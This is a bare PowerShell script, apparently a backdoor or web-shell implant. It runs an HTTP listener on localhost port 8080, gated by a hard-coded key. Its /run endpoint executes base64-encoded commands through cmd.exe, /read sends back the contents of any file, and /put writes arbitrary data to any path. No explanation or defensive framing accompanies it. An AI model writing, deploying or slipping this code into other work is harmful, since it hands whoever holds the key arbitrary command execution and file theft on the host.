$K='qwk2026'
$L=New-Object Net.HttpListener
$L.Prefixes.Add('http://127.0.0.1:8080/')
$L.Start()
while($true){
$c=$L.GetContext()
$out=''
try{
$u=$c.Request.Url
$q=@{}
foreach($t in ($u.Query.TrimStart('?') -split '&')){if($t){$kv=$t -split '=',2;$q[$kv[0]]=$kv[1]}}
if($q['k'] -ne $K){$out='AUTH'}
else{
switch($u.AbsolutePath){
'/run'{$s=($q['c'] -replace '-','+') -replace '_','/';$cmd=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s));$out=(cmd.exe /c $cmd 2>&1 | Out-String)}
'/read'{$s=($q['f'] -replace '-','+') -replace '_','/';$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s));$out=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p))}
'/put'{$s=($q['f'] -replace '-','+') -replace '_','/';$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s));$r=New-Object IO.StreamReader($c.Request.InputStream);$b=$r.ReadToEnd();$r.Close();[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($b.Trim()));$out='OK'}
default{$out='?'}
}
}
}catch{$out="ERR: $($_.Exception.Message)"}
$by=[Text.Encoding]::UTF8.GetBytes([string]$out)
$c.Response.StatusCode=200
$c.Response.ContentType='text/plain; charset=utf-8'
$c.Response.OutputStream.Write($by,0,$by.Length)
$c.Response.Close()
}
